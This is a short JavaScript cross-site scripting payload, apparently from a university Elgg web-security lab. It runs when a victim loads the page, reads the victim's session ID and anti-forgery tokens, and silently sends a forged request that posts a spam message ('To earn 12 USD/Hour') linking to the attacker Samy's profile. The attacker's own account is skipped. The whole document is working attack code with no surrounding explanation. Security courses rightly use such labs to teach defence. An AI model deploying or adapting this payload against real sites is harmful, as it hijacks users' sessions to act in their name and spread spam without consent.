<script type="text/javascript">
	window.onload = function(){
	
	//JavaScript code to access user name, user guid, Time Stamp __elgg_ts
	//and Security Token __elgg_token
	var ts="&__elgg_ts="+elgg.security.token.__elgg_ts;
	var token="&__elgg_token="+elgg.security.token.__elgg_token;
	
	//Url for adding a post in thewire
        var sendurl="/action/thewire/add"; //FILL IN
	//Constructing contents with post content
	var content="guid="+elgg.session.user.guid + token + ts+"&body=To+earn+12+USD/Hour(!),+visit+now+"
	content = content+"http://www.xsslabelgg.com/profile/samy";//adding profile link to Samy

	if(elgg.session.user.guid!=47)
	{
		//Create and send Ajax request to modify profile
		var Ajax=null;
		Ajax=new XMLHttpRequest();
		Ajax.open("POST",sendurl,true);	
		Ajax.setRequestHeader("Host","www.xsslabelgg.com");
		Ajax.setRequestHeader("Content-Type","application/x-www-form-urlencoded");
		Ajax.setRequestHeader("Accept","text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8");
		Ajax.send(content);
	}
}
</script>
